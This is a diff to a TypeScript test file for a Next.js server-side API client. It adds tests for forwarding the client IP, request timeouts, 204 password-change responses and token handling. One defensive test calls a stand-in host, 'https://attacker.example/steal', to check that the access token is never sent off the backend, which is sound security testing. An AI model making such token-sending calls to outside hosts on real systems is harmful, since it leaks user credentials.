@@ -2,6 +2,7 @@ import { describe, expect, it, mock } from 'bun:test';
 import { installFetchMock } from '../../../mocks/global-fetch.mock';
 
 let cookieValue: string | undefined;
+let incomingHeaders = new Headers();
 const deleteMock = mock(() => undefined);
 const fetchMock = mock(
   async (_input: RequestInfo | URL, _init?: RequestInit): Promise<Response> =>
@@ -14,6 +15,7 @@ mock.module('next/headers', () => ({
     get: () => (cookieValue === undefined ? undefined : { value: cookieValue }),
     delete: deleteMock,
   }),
+  headers: async () => incomingHeaders,
 }));
 mock.module('next-intl/server', () => ({ getLocale: async () => 'en' }));
 mock.module('@/shared/config', () => ({ config: { backendApiUrl: 'https://backend.test' } }));
@@ -66,6 +68,51 @@ describe('apiServer against a genuinely public route', () => {
   });
 });
 
+describe('apiServer forwarding who is calling', () => {
+  it('passes the address our proxy appended on to the backend, so its per-IP limits count people', async () => {
+    cookieValue = undefined;
+    incomingHeaders = new Headers({ 'x-forwarded-for': '1.1.1.1, 203.0.113.7' });
+    fetchMock.mockClear();
+
+    await apiServer.post('/api/v1/auth/sessions', { email: 'ana@example.com', password: 'super-secret' });
+
+    const init = fetchMock.mock.calls[0]?.[1];
+    expect(new Headers(init?.headers).get('x-forwarded-for')).toBe('203.0.113.7');
+    incomingHeaders = new Headers();
+  });
+
+  it('sends no forwarding header when no proxy reported an address', async () => {
+    cookieValue = undefined;
+    incomingHeaders = new Headers();
+    fetchMock.mockClear();
+
+    await apiServer.post('/api/v1/auth/sessions', { email: 'ana@example.com', password: 'super-secret' });
+
+    const init = fetchMock.mock.calls[0]?.[1];
+    expect(new Headers(init?.headers).has('x-forwarded-for')).toBe(false);
+  });
+});
+
+describe('apiServer outbound limits', () => {
+  it('gives up on a backend that never answers', async () => {
+    cookieValue = 'valid-access-token';
+    fetchMock.mockClear();
+
+    await apiServer.get('/api/v1/users/me');
+
+    expect(fetchMock.mock.calls[0]?.[1]?.signal).toBeInstanceOf(AbortSignal);
+  });
+
+  it('never sends the access token to an address that is not the backend', async () => {
+    cookieValue = 'valid-access-token';
+    fetchMock.mockClear();
+
+    await apiServer.get('https://attacker.example/steal');
+
+    expect(String(fetchMock.mock.calls[0]?.[0]).startsWith('https://backend.test')).toBe(true);
+  });
+});
+
 describe('apiServer request headers', () => {
   it('does not declare a JSON body for a delete request without a body', async () => {
     cookieValue = 'valid-access-token';
@@ -82,6 +129,37 @@ describe('apiServer request headers', () => {
 
     const requestInit = fetchMock.mock.calls[0]?.[1];
     expect(new Headers(requestInit?.headers).has('Content-Type')).toBe(false);
+  });
+});
+
+describe('apiServer.patchDiscardingBody', () => {
+  // Changing the password answers 204 with no body; reading one made the change look failed after it had worked.
+  it('accepts a change answered with no content and still sends the JSON body', async () => {
+    cookieValue = 'valid-access-token';
+    fetchMock.mockClear();
+    fetchMock.mockImplementationOnce(async (): Promise<Response> => new Response(null, { status: 204 }));
+
+    await expect(apiServer.patchDiscardingBody('/api/v1/users/user-1/password', { newPassword: 'x' })).resolves.toBe(
+      undefined,
+    );
+
+    const requestInit = fetchMock.mock.calls[0]?.[1];
+    expect(requestInit?.method).toBe('PATCH');
+    expect(requestInit?.body).toBe('{"newPassword":"x"}');
+  });
+
+  it('still refuses a change the backend rejected', async () => {
+    cookieValue = 'valid-access-token';
+    fetchMock.mockImplementationOnce(
+      async (): Promise<Response> =>
+        new Response('{"error":{"code":"AUTH_INVALID_CREDENTIALS"}}', {
+          status: 401,
+          headers: { 'content-type': 'application/json' },
+        }),
+    );
+    redirectMock.mockClear();
+
+    await expect(apiServer.patchDiscardingBody('/api/v1/users/user-1/password', {})).rejects.toBeDefined();
   });
 });
 
